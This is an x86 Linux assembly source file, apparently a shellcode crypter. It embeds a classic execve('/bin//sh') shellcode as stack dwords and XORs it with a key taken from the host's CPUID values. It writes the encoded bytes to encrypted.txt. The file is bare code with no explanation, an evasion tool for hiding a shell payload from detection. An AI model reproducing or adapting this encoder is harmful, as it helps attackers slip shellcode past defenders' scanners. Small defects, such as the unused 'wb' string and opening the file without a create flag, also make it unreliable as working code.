;encryptor.asm

SECTION .data
	s1 db "wb",0
	s2: db "encrypted.txt",0

SECTION .text

global _start




_start:

	xor eax,eax
	xor ebx,ebx
	xor edx,edx
	xor ecx,ecx

	mov al,1      
	cpuid

	add eax, ebx
	add eax, ecx
	add eax, edx


	xor ebx,ebx
	xor edx,edx
	xor ecx,ecx


	jmp short encryptor



encryptor:

	sub esp,0x48

	mov    DWORD [esp+0x3c],0x0
	mov    DWORD [esp+0x38],0x0
	mov    DWORD [esp+0x1e],0x6850c031
	mov    DWORD [esp+0x22],0x68732f2f
	mov    DWORD [esp+0x26],0x69622f68
	mov    DWORD [esp+0x2a],0x50e3896e
	mov    DWORD [esp+0x2e],0x8953e289
	mov    DWORD [esp+0x32],0xcd0bb0e1
	mov    BYTE  [esp+0x36],0x80

	mov dword [esp+0x19], eax

	mov BYTE [esp+0x1d],0x0

	xor ecx,ecx
	mov cl, 25

looper:

	mov    eax,DWORD [esp+0x3c]
	cdq    
	shr    edx,0x1e
	add    eax,edx
	and    eax,0x3
	sub    eax,edx
	mov    DWORD [esp+0x38],eax
	lea    edx,[esp+0x1e]
	mov    eax,DWORD [esp+0x3c]
	add    eax,edx
	movzx  edx,BYTE [eax]
	lea    ebx,[esp+0x19]
	mov    eax,DWORD [esp+0x38]
	add    eax,ebx
	movzx  eax,BYTE [eax]
	xor    eax,edx
	lea    ebx,[esp+0x1e]
	mov    edx,DWORD [esp+0x3c]
	add    edx,ebx
	mov    BYTE [edx],al
	add    DWORD [esp+0x3c],0x1
	loop   looper



	xor ebx,ebx
	xor edx,edx
	xor ecx,ecx
	xor eax,eax

	mov ebx, s2
	mov eax, 5
	mov ecx, 2
	int 0x80

	mov ebx, eax
	lea ecx, [esp+0x1e]
	mov edx, 25
	xor eax,eax
	mov eax, 4
	int 0x80

	xor eax, eax
	mov al, 1      
	xor ebx,ebx
	int 0x80

